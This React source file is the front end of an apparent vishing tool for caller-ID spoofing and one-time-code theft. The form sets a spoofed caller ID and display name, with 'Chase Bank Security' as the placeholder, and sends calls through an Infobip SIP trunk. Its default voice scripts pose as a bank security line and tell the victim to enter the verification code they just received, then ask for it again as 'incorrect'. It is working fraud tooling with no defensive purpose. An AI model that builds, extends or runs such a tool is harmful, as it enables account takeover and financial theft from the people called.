import React, { useState } from 'react';
import api from '../services/api';
import { Button } from './ui/button';
import { Input } from './ui/input';
import { Label } from './ui/label';
import { Textarea } from './ui/textarea';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from './ui/select';
import { toast } from 'sonner';
import { Loader2, Phone } from 'lucide-react';
import CallLogs from './CallLogs';

export default function Spoofing() {
  const [loading, setLoading] = useState(false);
  const [liveEvents, setLiveEvents] = useState([]);
  const [activeCall, setActiveCall] = useState(null);
  const [formData, setFormData] = useState({
    from_number: '',
    to_number: '',
    spoofed_caller_id: '',
    from_display_name: '',
    recipient_name: '',
    service_name: '',
    provider: 'infobip_sip',
    language: 'en-US',
    tts_voice: 'Aurora',
    digits: 6,
    step_1_message: 'Hello {name}. We have detected a login attempt to your {service} account from a new device or location.\nIf you did not recognize this request, please press 1.\nIf this was you, press 0 to approve.',
    step_2_message: 'Alright, we just sent a {digit} digit verification code to your number. If you received it, Could you please enter it using your dial pad?',
    step_3_message: 'Okay, please wait a moment while we verify the code.',
    accepted_message: 'Okay! We\'ve declined the sign-in request, and your account is safe. Thanks for your time, have a nice day!',
    rejected_message: 'I\'m sorry, but the code you entered is incorrect. Could you please enter it again? The code should be {digit} digits.'
  });

  const handleChange = (name, value) => {
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!formData.from_number || !formData.to_number || !formData.spoofed_caller_id || !formData.from_display_name) {
      toast.error('Please fill all required fields');
      return;
    }

    setLoading(true);
    try {
      const response = await api.post('/calls/spoof/start', formData);
      
      if (response.data.success) {
        toast.success('Spoofed call initiated successfully!', {
          description: `Call ID: ${response.data.call_id}`
        });
        
        setActiveCall(response.data);
        setLiveEvents(prev => [{
          event: 'Spoofed Call Initiated',
          time: new Date().toISOString(),
          message: `Spoofing ${formData.spoofed_caller_id} to ${formData.to_number}`
        }, ...prev]);
      }
    } catch (error) {
      console.error('Error initiating spoofed call:', error);
      toast.error(error.response?.data?.detail || 'Failed to initiate spoofed call. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="grid grid-cols-1 lg:grid-cols-2 gap-6" data-testid="spoofing-page">
      {/* LEFT SIDE - SPOOFING FORM */}
      <div className="space-y-6">
        <div>
          <h2 className="text-2xl font-bold text-white mb-2">SIP Trunking Spoofing</h2>
          <p className="text-gray-400">Custom Caller ID Display via Infobip SIP</p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="glass-effect rounded-xl p-6 space-y-4">
            <h3 className="text-lg font-semibold text-white mb-4">Caller ID Spoofing</h3>

            {/* Spoofing Fields */}
            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label htmlFor="from_number" className="text-gray-300">Actual From Number (SIP Trunk)</Label>
                <Input
                  id="from_number"
                  type="tel"
                  placeholder="+1234567890"
                  value={formData.from_number}
                  onChange={(e) => handleChange('from_number', e.target.value)}
                  className="input-field"
                  required
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="to_number" className="text-gray-300">To Number</Label>
                <Input
                  id="to_number"
                  type="tel"
                  placeholder="+0987654321"
                  value={formData.to_number}
                  onChange={(e) => handleChange('to_number', e.target.value)}
                  className="input-field"
                  required
                />
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label htmlFor="spoofed_caller_id" className="text-gray-300">Spoofed Caller ID *</Label>
                <Input
                  id="spoofed_caller_id"
                  type="tel"
                  placeholder="+1800BANK123"
                  value={formData.spoofed_caller_id}
                  onChange={(e) => handleChange('spoofed_caller_id', e.target.value)}
                  className="input-field"
                  required
                />
                <p className="text-xs text-gray-500">Number shown to recipient</p>
              </div>

              <div className="space-y-2">
                <Label htmlFor="from_display_name" className="text-gray-300">Display Name *</Label>
                <Input
                  id="from_display_name"
                  type="text"
                  placeholder="Chase Bank Security"
                  value={formData.from_display_name}
                  onChange={(e) => handleChange('from_display_name', e.target.value)}
                  className="input-field"
                  required
                />
                <p className="text-xs text-gray-500">Name shown on caller ID</p>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label htmlFor="recipient_name" className="text-gray-300">Recipient Name</Label>
                <Input
                  id="recipient_name"
                  placeholder="John Doe"
                  value={formData.recipient_name}
                  onChange={(e) => handleChange('recipient_name', e.target.value)}
                  className="input-field"
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="service_name" className="text-gray-300">Service Name</Label>
                <Input
                  id="service_name"
                  placeholder="Chase Bank"
                  value={formData.service_name}
                  onChange={(e) => handleChange('service_name', e.target.value)}
                  className="input-field"
                />
              </div>
            </div>

            {/* Voice Settings */}
            <div className="grid grid-cols-3 gap-4">
              <div className="space-y-2">
                <Label htmlFor="language" className="text-gray-300">Language</Label>
                <Select value={formData.language} onValueChange={(value) => handleChange('language', value)}>
                  <SelectTrigger className="input-field">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="en-US">English (US)</SelectItem>
                    <SelectItem value="en-GB">English (UK)</SelectItem>
                    <SelectItem value="es-ES">Spanish</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              <div className="space-y-2">
                <Label htmlFor="tts_voice" className="text-gray-300">Voice</Label>
                <Select value={formData.tts_voice} onValueChange={(value) => handleChange('tts_voice', value)}>
                  <SelectTrigger className="input-field">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="Aurora">Aurora (Neural)</SelectItem>
                    <SelectItem value="Chirp">Chirp HD</SelectItem>
                    <SelectItem value="woman">Woman</SelectItem>
                    <SelectItem value="man">Man</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              <div className="space-y-2">
                <Label htmlFor="digits" className="text-gray-300">OTP Digits</Label>
                <Input
                  id="digits"
                  type="number"
                  min="4"
                  max="10"
                  value={formData.digits}
                  onChange={(e) => handleChange('digits', parseInt(e.target.value))}
                  className="input-field"
                />
              </div>
            </div>
          </div>

          {/* Messages */}
          <div className="glass-effect rounded-xl p-6 space-y-4">
            <h3 className="text-lg font-semibold text-white mb-4">Voice Messages</h3>

            <div className="space-y-2">
              <Label htmlFor="step_1_message" className="text-gray-300">Step 1 Message</Label>
              <Textarea
                id="step_1_message"
                rows={3}
                value={formData.step_1_message}
                onChange={(e) => handleChange('step_1_message', e.target.value)}
                className="input-field font-mono text-sm"
                placeholder="Use {name}, {service}, {digit} for variables"
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="step_2_message" className="text-gray-300">Step 2 Message</Label>
              <Textarea
                id="step_2_message"
                rows={2}
                value={formData.step_2_message}
                onChange={(e) => handleChange('step_2_message', e.target.value)}
                className="input-field font-mono text-sm"
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="step_3_message" className="text-gray-300">Step 3 Message</Label>
              <Textarea
                id="step_3_message"
                rows={2}
                value={formData.step_3_message}
                onChange={(e) => handleChange('step_3_message', e.target.value)}
                className="input-field font-mono text-sm"
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label htmlFor="accepted_message" className="text-gray-300">Accepted Message</Label>
                <Textarea
                  id="accepted_message"
                  rows={2}
                  value={formData.accepted_message}
                  onChange={(e) => handleChange('accepted_message', e.target.value)}
                  className="input-field font-mono text-sm"
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="rejected_message" className="text-gray-300">Rejected Message</Label>
                <Textarea
                  id="rejected_message"
                  rows={2}
                  value={formData.rejected_message}
                  onChange={(e) => handleChange('rejected_message', e.target.value)}
                  className="input-field font-mono text-sm"
                />
              </div>
            </div>
          </div>

          <Button
            type="submit"
            disabled={loading}
            className="w-full bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700"
            data-testid="spoof-call-button"
          >
            {loading ? (
              <>
                <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                Initiating Spoofed Call...
              </>
            ) : (
              <>
                <Phone className="w-4 h-4 mr-2" />
                Make Spoofed Call
              </>
            )}
          </Button>
        </form>
      </div>

      {/* RIGHT SIDE - CALL LOGS */}
      <CallLogs events={liveEvents} activeCall={activeCall} />
    </div>
  );
}
